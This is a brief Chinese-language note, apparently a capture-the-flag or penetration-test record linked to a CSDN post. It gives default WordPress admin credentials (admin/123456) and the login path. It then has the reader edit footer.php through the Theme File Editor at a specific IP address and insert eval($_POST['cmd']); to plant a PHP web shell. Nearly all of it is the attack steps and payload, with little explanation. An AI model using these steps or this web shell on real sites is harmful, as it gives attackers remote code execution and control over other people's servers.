[Link](https://blog.csdn.net/longlangci/article/details/131686439)

登录 /wp-login.php

```sh
# 账号：admin
# 密码：123456
```

后台地址是 `example.com/wp-admin/`

```sh
修改主题文件：Appearance—>Theme File Editor—>Theme Footer成功getshell。
http://39.99.136.199/wp-admin/theme-editor.php?file=footer.php&theme=twentytwentyone
加上
eval($_POST["cmd"]);
```
